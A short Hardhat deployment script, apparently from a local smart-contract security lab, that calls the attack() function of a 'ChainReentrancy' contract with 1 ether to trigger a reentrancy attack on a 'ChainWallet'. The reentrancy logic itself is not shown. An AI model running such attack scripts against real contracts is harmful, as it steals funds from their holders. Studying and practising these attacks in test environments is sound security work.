import hre from "hardhat";

async function main() {
  const { ethers } = hre;

  // Address of the deployed ChainReentrancy contract
  const chainReentrancyAddress = "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512";

  // Attach to the deployed ChainReentrancy contract
  const ChainReentrancy = await ethers.getContractAt(
    "ChainReentrancy",
    chainReentrancyAddress
  );

  // Perform the attack
  const attackAmount = ethers.utils.parseEther("1");
  await ChainReentrancy.attack({ value: attackAmount });
  console.log(`Attack performed on ChainWallet with ${attackAmount}`);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
